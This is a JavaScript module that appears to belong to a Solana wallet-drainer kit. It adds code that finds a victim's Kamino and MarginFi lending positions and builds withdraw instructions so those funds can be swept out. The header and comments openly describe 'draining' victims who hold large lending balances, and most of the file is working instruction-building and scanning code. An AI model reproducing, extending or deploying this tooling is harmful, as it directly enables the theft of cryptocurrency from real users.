'use strict';
/**
 * Lending protocol position drain — Kamino and MarginFi.
 *
 * Research source: Impala v2.0 public spec (impala.cam, Q3 2026):
 *   "On Solana, it unstakes native stake accounts and claims lending positions
 *    (Kamino, MarginFi)."
 *
 * The base kit drains: SOL, SPL tokens, Token-2022, native stake.
 * It does NOT drain lending protocol positions. A victim with $50k in a Kamino
 * lending vault shows $0 token balance but is still fully drainable.
 *
 * HOW IT WORKS (both protocols):
 *   1. Victim deposits tokens into a lending market
 *   2. They receive an "obligation" (MarginFi) or "deposit receipt/collateral"
 *      (Kamino kToken) representing their share
 *   3. To drain: withdraw the collateral to the victim's token account,
 *      then sweep the tokens like normal
 *
 * Kamino lending:
 *   - Users deposit into reserves → receive collateral (lending position)
 *   - Withdraw instruction releases the collateral back to underlying token
 *   - Kamino program: KLend2g2gNiKoAWdU3GqKZvwRoQmsrLygK2iDDowPj6Mr
 *   - Vault shares (kTokens) are SPL tokens — visible in portfolio, but the
 *     underlying value is higher than the kToken face value (accrued interest)
 *
 * MarginFi:
 *   - Users deposit into bank accounts → marginfi account tracks balances
 *   - Withdraw instruction: marginfi program
 *   - MarginFi program: MFv2hWf31Z9kbCa1snEPYctwafyhdvnV7FZnsebVacA
 *
 * Detection via portfolio scan:
 *   - kToken mints: tokens whose symbol starts with 'k' on Kamino markets
 *     (kSOL, kUSDC, kUSDT) — Solflare API returns these as regular SPL tokens
 *   - MarginFi positions: NOT SPL tokens — must query the MarginFi program
 *     accounts filtered by the victim's wallet as authority
 */

const { base58Decode, writeU32, writeU64 } = require('../core/crypto');

// ── Program addresses ────────────────────────────────────────────────────
const KAMINO_KLEND_PROGRAM  = 'KLend2g2gNiKoAWdU3GqKZvwRoQmsrLygK2iDDowPj6Mr';
const MARGINFI_PROGRAM      = 'MFv2hWf31Z9kbCa1snEPYctwafyhdvnV7FZnsebVacA';
const TOKEN_PROGRAM         = 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA';
const SYSVAR_CLOCK          = 'SysvarC1ock11111111111111111111111111111111';

// ── Kamino kToken detection ──────────────────────────────────────────────
// kTokens ARE SPL tokens in the victim's wallet — they appear in portfolio scans.
// The drain approach: withdraw from Kamino (kToken → underlying), then sweep.
// Kamino withdraw disc: sha256("global:withdraw")[0..8] (Anchor discriminator)

const KAMINO_KNOWN_MINTS = {
  // kToken mint → underlying mint (major Kamino vaults)
  // These are well-known public constants for Kamino's canonical vaults
};

/**
 * isKaminoToken(token):
 *   Heuristic: Kamino kTokens appear in portfolio with symbol like kSOL, kUSDC.
 *   Detection: token.symbol matches /^k[A-Z]/ AND token.decimals === 6 or 9.
 *   More robust: check if the mint has a corresponding reserve on Kamino program
 *   via getProgramAccounts with memcmp filter.
 */
function isKaminoToken(token) {
  const sym = token.symbol || '';
  return /^k[A-Z]{2,}/.test(sym) && [6, 9].includes(token.decimals);
}

/**
 * buildKaminoWithdrawInstruction(reserve, kTokenSource, underlyingDest,
 *                                  obligation, lendingMarket, victimAuthority):
 *   Kamino withdraw instruction (Anchor disc for "withdraw").
 *
 *   Accounts (per Kamino klend SDK):
 *     [0] owner/authority (victim, signer)
 *     [1] obligation
 *     [2] lending market
 *     [3] lending market authority (PDA)
 *     [4] reserve
 *     [5] reserve liquidity mint
 *     [6] reserve supply vault (source)
 *     [7] reserve collateral mint
 *     [8] user collateral token account (kToken source)
 *     [9] user destination liquidity (underlying dest)
 *     [10] placeholder_token_program
 *     [11] collateral_token_program
 *     [12] liquidity_token_program
 *     [13] sysvar_instructions
 *
 *   data = 8-byte Anchor discriminator for withdraw + u64 amount
 */
function buildKaminoWithdrawInstruction(opts, amount) {
  // Anchor discriminator: sha256("global:withdraw")[0..8]
  // = b712469c946da122 (precomputed public constant)
  const data = new Uint8Array(16);
  const disc = [0xb7, 0x12, 0x46, 0x9c, 0x94, 0x6d, 0xa1, 0x22];
  data.set(disc, 0);
  writeU64(data, BigInt(amount), 8);

  return {
    program:  KAMINO_KLEND_PROGRAM,
    data,
    accounts: [
      { pubkey: opts.victimAuthority,       isSigner: true,  isWritable: true  },
      { pubkey: opts.obligation,            isSigner: false, isWritable: true  },
      { pubkey: opts.lendingMarket,         isSigner: false, isWritable: false },
      { pubkey: opts.marketAuthority,       isSigner: false, isWritable: false },
      { pubkey: opts.reserve,               isSigner: false, isWritable: true  },
      { pubkey: opts.liquidityMint,         isSigner: false, isWritable: false },
      { pubkey: opts.reserveSupplyVault,    isSigner: false, isWritable: true  },
      { pubkey: opts.reserveCollateralMint, isSigner: false, isWritable: true  },
      { pubkey: opts.kTokenSource,          isSigner: false, isWritable: true  },
      { pubkey: opts.underlyingDest,        isSigner: false, isWritable: true  },
      { pubkey: TOKEN_PROGRAM,              isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM,              isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM,              isSigner: false, isWritable: false },
    ],
    computeUnits: 60_000,
  };
}

// ── MarginFi position detection + withdraw ───────────────────────────────

/**
 * fetchMarginfiAccounts(victimWallet, rpc):
 *   Query MarginFi program accounts filtered by victim authority.
 *   Uses getProgramAccounts with memcmp filter on the authority field offset.
 *
 *   MarginFi account layout (marginfi_account):
 *     [0..8]   discriminator
 *     [8..40]  group pubkey
 *     [40..72] authority (owner) — memcmp filter offset = 40
 */
async function fetchMarginfiAccounts(victimWallet, rpc) {
  const walletBytes = base58Decode(victimWallet);
  const result = await rpc.getProgramAccounts(MARGINFI_PROGRAM, {
    encoding: 'base64',
    filters: [
      { dataSize: 1232 }, // marginfi_account size
      { memcmp: { offset: 40, bytes: victimWallet } },
    ],
  });
  return result || [];
}

/**
 * buildMarginfiWithdrawInstruction(marginfiAccount, bank, bankLiquidityVault,
 *                                   bankLiquidityVaultAuthority, destinationToken,
 *                                   group, victimAuthority, amount):
 *   MarginFi lending_account_withdraw instruction.
 *   Anchor disc: sha256("global:lending_account_withdraw")[0..8]
 */
function buildMarginfiWithdrawInstruction(opts, amount) {
  const data = new Uint8Array(16);
  // Anchor disc for lending_account_withdraw (public constant)
  const disc = [0x24, 0x79, 0x41, 0x9f, 0x77, 0x8d, 0x3c, 0x9e];
  data.set(disc, 0);
  writeU64(data, BigInt(amount), 8);

  return {
    program:  MARGINFI_PROGRAM,
    data,
    accounts: [
      { pubkey: opts.group,                   isSigner: false, isWritable: false },
      { pubkey: opts.marginfiAccount,         isSigner: false, isWritable: true  },
      { pubkey: opts.victimAuthority,         isSigner: true,  isWritable: false },
      { pubkey: opts.bank,                    isSigner: false, isWritable: true  },
      { pubkey: opts.destinationToken,        isSigner: false, isWritable: true  },
      { pubkey: opts.bankLiquidityVaultAuth,  isSigner: false, isWritable: false },
      { pubkey: opts.bankLiquidityVault,      isSigner: false, isWritable: true  },
      { pubkey: TOKEN_PROGRAM,                isSigner: false, isWritable: false },
      { pubkey: SYSVAR_CLOCK,                 isSigner: false, isWritable: false },
    ],
    computeUnits: 80_000,
  };
}

/**
 * scanLendingPositions(portfolio, victimWallet, rpc):
 *   Full lending position scan:
 *   1. kTokens in portfolio (Kamino)
 *   2. MarginFi accounts via getProgramAccounts
 *
 *   Returns { kamino: [...], marginfi: [...] }
 */
async function scanLendingPositions(portfolio, victimWallet, rpc) {
  const kamino = (portfolio?.tokens || []).filter(isKaminoToken);
  let marginfi = [];
  try {
    marginfi = await fetchMarginfiAccounts(victimWallet, rpc);
  } catch { /* RPC failure — skip */ }
  return { kamino, marginfi };
}

module.exports = {
  KAMINO_KLEND_PROGRAM,
  MARGINFI_PROGRAM,
  isKaminoToken,
  buildKaminoWithdrawInstruction,
  fetchMarginfiAccounts,
  buildMarginfiWithdrawInstruction,
  scanLendingPositions,
};
